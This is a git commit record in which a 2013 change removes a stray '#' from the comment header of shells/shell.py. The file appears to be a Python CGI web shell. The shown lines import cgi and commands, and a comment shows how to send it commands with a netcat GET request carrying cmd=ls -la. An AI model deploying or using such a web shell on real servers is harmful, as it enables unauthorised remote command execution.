99242cb408c302ee6b8912763f3d242fb58e0e0c
KINGSABRI <king.sabri@gmail.com>
2013-10-05 02:21:20 +0300

    _

--- shells/shell.py
+++ shells/shell.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# # echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc localhost 80
+# echo "GET /cgi/shell.rb?cmd=ls%20-la" | nc localhost 80
 import cgi, commands
 form = cgi.FieldStorage() 
 print "Content-type:text/html\r\n"
